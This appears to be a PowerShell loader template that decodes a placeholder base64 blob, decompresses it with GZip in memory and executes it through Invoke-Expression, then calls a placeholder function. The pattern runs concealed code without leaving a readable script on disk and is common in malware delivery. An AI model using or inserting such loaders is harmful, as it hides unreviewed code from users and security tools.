$base64 = "[BASE64]"
$data = [System.Convert]::FromBase64String($base64)
$ms = New-Object System.IO.MemoryStream
$ms.Write($data, 0, $data.Length)
$ms.Seek(0,0) | Out-Null
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($cs)
$t = $sr.readtoend()
Invoke-Expression $t
Invoke-Expression [FUNCTION_NAME]